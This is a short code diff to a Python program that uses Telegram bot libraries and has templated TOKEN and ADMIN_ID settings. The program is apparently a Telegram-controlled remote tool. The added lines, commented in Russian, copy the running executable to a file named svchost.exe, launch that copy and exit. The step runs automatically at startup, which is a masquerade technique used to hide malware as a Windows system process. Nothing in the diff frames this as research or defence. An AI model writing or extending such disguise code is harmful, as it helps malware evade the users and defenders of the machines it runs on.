@@ -31,6 +31,26 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
 from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler
 
+# ============ АВТО-ПЕРЕИМЕНОВАНИЕ В svchost.exe ============
+def rename_to_svchost():
+    try:
+        exe_path = sys.executable
+        exe_dir = os.path.dirname(exe_path)
+        new_path = os.path.join(exe_dir, "svchost.exe")
+        
+        # Если текущий файл НЕ svchost.exe
+        if not exe_path.lower().endswith("svchost.exe"):
+            # Копируем себя в svchost.exe
+            shutil.copy2(exe_path, new_path)
+            # Запускаем копию
+            os.startfile(new_path)
+            # Закрываем текущий процесс
+            sys.exit()
+    except:
+        pass
+
+rename_to_svchost()
+
 # ============ КОНФИГ ============
 TOKEN = "{{TOKEN}}"
 ADMIN_ID = {{ADMIN_ID}}
